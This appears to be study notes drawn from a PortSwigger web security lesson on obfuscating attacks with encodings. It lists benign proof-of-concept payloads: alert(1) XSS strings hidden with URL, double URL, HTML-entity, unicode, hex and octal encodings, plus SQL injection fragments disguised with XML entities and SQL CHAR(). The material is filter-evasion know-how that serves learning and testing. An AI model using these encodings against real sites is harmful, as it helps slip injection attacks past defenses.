# [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)

## Obfuscation via URL encoding

```
[...]/?search=Fish+%26+Chips
```

## Obfuscation via double URL encoding

```
[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

```
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

## Obfuscation via HTML encoding

```
<img src=x onerror="&#x61;lert(1)">
```

## Leading zeros

```
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

## Obfuscation via XML encoding

```
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

## Obfuscation via unicode escaping

```
eval("\u0061lert(1)")
```

```
<a href="javascript\u{0000000003a}alert(1)">Click me</a>
```

## Obfuscation via hex escaping

```
eval("\x61lert")
```

## Obfuscation via octal escaping

```
eval("\141lert(1)")
```

## Obfuscation via multiple encodings

```
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```

```
<a href="javascript:\u0061lert(1)">Click me</a>
```

```
<a href="javascript:alert(1)">Click me</a>
```

## Obfuscation via the SQL CHAR() function

```
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```
